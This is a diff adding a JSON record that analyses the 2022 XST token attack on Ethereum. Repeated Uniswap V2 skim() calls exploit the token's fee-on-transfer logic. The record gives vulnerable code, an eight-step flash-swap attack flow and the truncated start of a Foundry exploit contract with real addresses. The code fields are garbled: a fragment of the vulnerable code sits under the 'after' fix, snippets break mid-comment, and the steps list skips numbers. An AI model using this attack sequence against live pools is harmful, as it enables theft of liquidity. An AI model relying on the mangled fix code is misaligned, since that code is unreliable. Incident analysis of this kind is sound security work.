@@ -1,0 +1,35 @@
+{
+ "id": "2022__2022-08_XST_SkimReserveManipulation",
+ "source_file": "2022/2022-08_XST_SkimReserveManipulation.md",
+ "title": "XST — skim() Repeated Reserve Manipulation Attack Analysis",
+ "date": "2022-08-01",
+ "protocol": "XST Token",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~Unconfirmed",
+ "loss_usd": null,
+ "root_cause": "XST reserve manipulation via 15 repeated `skim()` calls on the WETH/XST pool, followed by a reverse swap",
+ "attack_tx": "0x873f7c77d5489c1990f701e9bb312c103c5ebcdcf0a472db726730814bfd55f3",
+ "vulnerable_contract": null,
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ XST fee-on-transfer and skim() interaction vulnerability\n// Fee handling in XST._transfer()\nfunction _transfer(address sender, address recipient, uint256 amount) internal override {\n    uint256 fee = amount * feeRate / 1000;\n    uint256 netAmount = amount - fee;\n\n    super._transfer(sender, feeWallet, fee);\n    super._transfer(sender, recipient, netAmount);\n    //",
+  "❌ Result: actual amount deposited to pair = netAmount < amount\n    //    pair's balanceOf(xst) > reserve(xst) state persists\n    //    → discrepancy can be repeatedly extracted via skim()\n}\n\n// Uniswap V2 pair's skim() - standard\nfunction skim(address to) external {\n    //",
+  "❌ fee-on-transfer tokens create a new discrepancy on every skim() call\n    uint256 excess0 = balance0 - reserve0;\n    uint256 excess1 = balance1 - reserve1;\n    // Transfer excess → but XST fee-on-transfer causes\n    // a new fee during the transfer → creating yet another discrepancy\n    IERC20(token0).transfer(to, excess0);\n    IERC20(token1).transfer(to, excess1);\n    //"
+ ],
+ "code_after": [
+  "✅ This is why the call can be repeated\n}\n\n//",
+  "✅ Fix: handle fee-on-transfer tokens in skim()\nfunction skim(address to) external nonReentrant {\n    // Calculate based on actual balances\n    uint256 balance0 = IERC20(token0).balanceOf(address(this));\n    uint256 balance1 = IERC20(token1).balanceOf(address(this));\n    // Update reserves with actual received amounts, accounting for fee-on-transfer\n    _update(balance0, balance1, reserve0, reserve1);\n}"
+ ],
+ "steps": [
+  "[1] WETH/USDT.swap(2x WETH_reserve) → flash swap borrow",
+  "[3] WETH/XST.swap(0, XST_reserve * 50%) → acquire XST",
+  "[4] WETH/XST.sync() → reset reserves to current balances",
+  "[7] Accumulated XST → reverse swap to WETH"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] WETH/USDT.swap(2x WETH_reserve) → flash swap borrow\n    │       uniswapV2Call() callback entered\n    │\n    ├─[2] Transfer WETH to WETH/XST pair\n    │\n    ├─[3] WETH/XST.swap(0, XST_reserve * 50%) → acquire XST\n    │\n    ├─[4] WETH/XST.sync() → reset reserves to current balances\n    │\n    ├─[5] Partially transfer held XST to WETH/XST pair\n    │\n    ├─[6] skim() × 15 iterations\n    │       └─ Each call:\n    │           ├─ Reserve discrepancy created by XST fee-on-transfer\n    │           └─ Excess XST extracted to attacker\n    │\n    ├─[7] Accumulated XST → reverse swap to WETH\n    │\n    └─[8] Repay flash swap, net WETH profit",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n    function transfer(address, uint256) external returns (bool);\n    function approve(address, uint256) external returns (bool);\n}\n\ninterface IUni_Pair_V2 {\n    function swap(uint256, uint256, address, bytes calldata) external;\n    function skim(address) external;\n    function sync() external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n}\n\ncontract XSTExploit is Test {\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    IERC20 XST = IERC20(0x91383A15C391c142b80045D8b4730C1c37ac0378);\n    IUni_Pair_V2 pair694f = IUni_Pair_V2(0x694f8F9E0ec188f528d6354fdd0e47DcA7"
+ ]
+}
